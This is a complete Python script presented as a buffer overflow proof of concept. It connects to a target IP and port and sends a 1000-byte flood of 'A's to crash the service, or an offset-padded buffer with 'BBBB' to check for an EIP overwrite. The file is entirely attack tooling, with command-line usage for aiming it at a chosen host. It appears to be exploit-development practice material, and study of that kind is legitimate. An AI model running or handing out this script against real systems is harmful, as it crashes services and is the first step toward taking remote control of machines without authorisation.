import socket
import sys

def fuzz(ip, port=9999, offset=0):
    print(f"[*] Starting buffer overflow PoC against {ip}:{port}")

    # Generate a pattern to find offset (if offset is 0)
    if offset == 0:
        buffer = b"A" * 1000
        print("[*] Sending 1000 'A's to crash the service...")
    else:
        buffer = b"A" * offset + b"B" * 4 + b"C" * (1000 - offset - 4)
        print(f"[*] Sending payload with offset: {offset}")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        s.send(buffer)
        s.close()
        print("[+] Payload sent. Check the target for crash or EIP overwrite.")
    except Exception as e:
        print(f"[!] Connection failed: {e}")

def usage():
    print("Usage:")
    print(f"  python3 {sys.argv[0]} <target_ip> [port] [offset]")
    print("  Example: python3 buffer_overflow_poc.py 192.168.1.10 9999 260")

def main():
    if len(sys.argv) < 2:
        usage()
        return

    ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
    offset = int(sys.argv[3]) if len(sys.argv) > 3 else 0

    fuzz(ip, port, offset)

if __name__ == "__main__":
    main()

